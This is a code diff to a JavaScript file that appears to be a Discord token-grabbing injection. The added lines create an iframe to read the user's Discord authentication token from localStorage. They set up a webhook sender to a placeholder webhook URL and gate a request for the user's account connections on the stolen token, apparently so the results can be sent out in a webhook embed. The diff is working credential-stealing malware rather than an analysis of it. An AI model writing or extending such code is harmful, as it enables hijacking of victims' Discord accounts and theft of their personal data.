@@ -5,6 +5,11 @@ const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
 const dawebhook = "%WEBHOUK%1"
+const { Webhook, MessageBuilder } = require('discord-webhook-sender');
+const hook = new Webhook(dawebhook)
+
+const FnLComa = /^"|"$/g;
+const token = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token.replace(FnLComa, '')
 
 const config = {
     "logout": "%LOGOUT%1",
@@ -185,7 +190,11 @@ function injectNotify() {
 
     })
 	
-	axios
+	if(!token){
+        return;
+    } else {
+
+    axios
             .get(
                 "https://discord.com/api/v9/users/@me/connections",
                 {
@@ -197,6 +206,7 @@ function injectNotify() {
             )
         .then((conns) => {
                 if (conns.data.length >= 1) {
+
 
 
                 var culoembed = {
@@ -222,5 +232,6 @@ function injectNotify() {
             })
                 }
             })
+    }
 
 }
